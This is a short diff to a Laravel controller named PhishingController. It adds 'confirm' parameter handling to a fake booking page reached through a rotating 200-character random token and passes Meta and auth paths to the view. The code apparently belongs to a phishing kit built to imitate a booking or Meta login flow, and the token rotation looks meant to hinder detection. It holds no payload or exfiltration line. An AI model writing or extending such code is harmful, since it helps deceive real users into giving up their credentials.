@@ -172,18 +172,23 @@ class PhishingController extends Controller
     public function showBookingOtio(Request $request, $token = null)
     {
         $session = $this->getSessionData();
+        $isConfirm = $request->has('confirm') || $request->query('confirm') === '1';
+        $confirmParam = $isConfirm ? '?confirm=1' : '';
+
         // Always refresh token on each visit
         if (!session('_otio_token') || $token !== session('_otio_token')) {
             $newToken = Str::random(200);
             session(['_otio_token' => $newToken]);
-            return redirect('/app/intro/availability-' . $newToken);
+            return redirect('/app/intro/availability-' . $newToken . $confirmParam);
         }
 
-        session(['booking_return_url' => url('/app/intro/availability-' . session('_otio_token'))]);
+        session(['booking_return_url' => url('/app/intro/availability-' . session('_otio_token') . '?confirm=1')]);
 
         return view('booking-otio', [
             'metaBasePath' => $session['metaBasePath'],
-            'authPath' => $session['authPath']
+            'authPath' => $session['authPath'],
+            'isConfirm' => $isConfirm,
+            'bookingInfo' => session('booking_info', null)
         ]);
     }
 
